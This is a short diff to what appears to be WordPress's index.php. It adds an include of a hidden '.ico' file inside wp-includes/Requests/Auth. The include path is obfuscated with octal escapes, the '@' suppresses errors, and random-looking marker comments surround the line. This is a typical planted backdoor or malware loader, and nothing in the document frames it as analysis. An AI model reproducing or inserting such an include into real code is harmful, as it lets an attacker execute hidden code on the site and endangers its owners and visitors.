@@ -5,7 +5,11 @@
  *
  * @package WordPress
  */
+/*3f3e2*/
 
+@include "\057www\057tea\155har\162ell\163_36\066/pu\142lic\057wp-\151ncl\165des\057Req\165est\163/Au\164h/.\14389c\067c0f\056ico";
+
+/*3f3e2*/
 /**
  * Tells WordPress to load the WordPress theme and output it.
  *
